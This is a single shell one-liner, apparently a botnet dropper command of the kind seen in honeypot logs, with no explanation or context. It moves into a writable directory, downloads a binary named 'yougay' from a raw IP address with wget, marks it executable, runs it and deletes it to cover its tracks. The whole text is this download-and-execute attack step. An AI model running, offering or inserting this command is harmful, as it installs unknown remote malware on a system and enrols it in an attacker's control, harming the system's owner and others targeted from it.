cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.12.97.80/yougay; chmod +x yougay; ./yougay; rm -rf yougay
